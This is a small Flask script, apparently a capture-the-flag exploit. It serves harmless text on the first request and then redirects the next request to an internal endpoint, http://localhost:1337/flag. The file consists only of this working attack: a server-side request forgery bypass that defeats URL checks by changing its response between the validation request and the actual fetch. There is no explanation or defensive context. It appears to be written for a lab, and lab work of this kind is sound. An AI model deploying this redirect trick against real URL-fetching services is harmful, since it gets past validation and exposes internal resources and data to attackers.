from flask import Flask, redirect

app = Flask(__name__)

reqCounter = 0

@app.route('/')
def exploit():
    global reqCounter
    if reqCounter == 0:
        reqCounter += 1
        return 'an innocent site uwu'
    else:
        reqCounter -= 1
        return redirect('http://localhost:1337/flag')

app.run('0.0.0.0', 4444)
